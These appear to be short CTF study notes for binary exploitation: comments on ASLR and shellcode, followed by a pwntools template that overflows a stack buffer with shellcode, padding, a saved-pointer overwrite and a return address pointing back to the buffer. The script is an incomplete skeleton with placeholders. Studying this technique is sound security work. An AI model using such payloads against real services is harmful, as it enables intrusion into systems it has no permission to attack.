# ldd <filename>
# ASLR -> randomizes addresses of memory segments i.e. heap and stack -> making difficult of vuln inorder to execute shellcode

# read -> read bytes irrespective of format specifier

# shellcode -> arbitrary code execution

from pwn import *

context.binary = binary = "./filename"

shellcode = b"\x48\x...."

p = process
p = remote('host',port)

output = p.recv()

buff_adr = <strip from input>

payload = shellcode + b"A"*(0x50-len(shellcode)) + b"B" * 0x8 + p64(buff_adr)

p.sendline(payload)
p.interactive()
